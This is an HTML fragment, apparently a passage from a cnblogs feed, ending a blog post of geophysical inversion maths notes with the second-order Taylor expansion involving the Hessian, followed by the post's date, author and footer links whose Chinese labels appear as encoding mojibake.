+<p></p><div class="math display">\[f(\mathbf{X}+\mathbf{P})=f(\mathbf{X})+\nabla{f(\mathbf{X})}^{T}\mathbf{P}+\frac{1}{2}\mathbf{P}^T\nabla^2f(\mathbf{X})\mathbf{P}+o(||\mathbf{P}||^2) \tag{27}
+\]</div><p></p>
+
+</div>
+<div class="clear"></div>
+
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0.002777777777777778" data-date-updated="2026-02-19 09:52">2026-02-19 09:48</span>&nbsp;
+<a href="https://www.cnblogs.com/GeophysicsWorker">GeoFXR</a>&nbsp;
+éè¯»(<span id="post_view_count">56</span>)&nbsp;
+è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(19624189);return false;">æ¶è</a>&nbsp;
+<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19624189', targetLink: 'https://www.cnblogs.com/GeophysicsWorker/p/19624189', title: 'å¸ä¼åæ°å­¦åºç¡ç¬è®°ï¼åï¼ï¼Hessian ç©éµå Taylor å±å¼' })">ä¸¾æ¥</a>
 </div>
          ]]>
     </description>
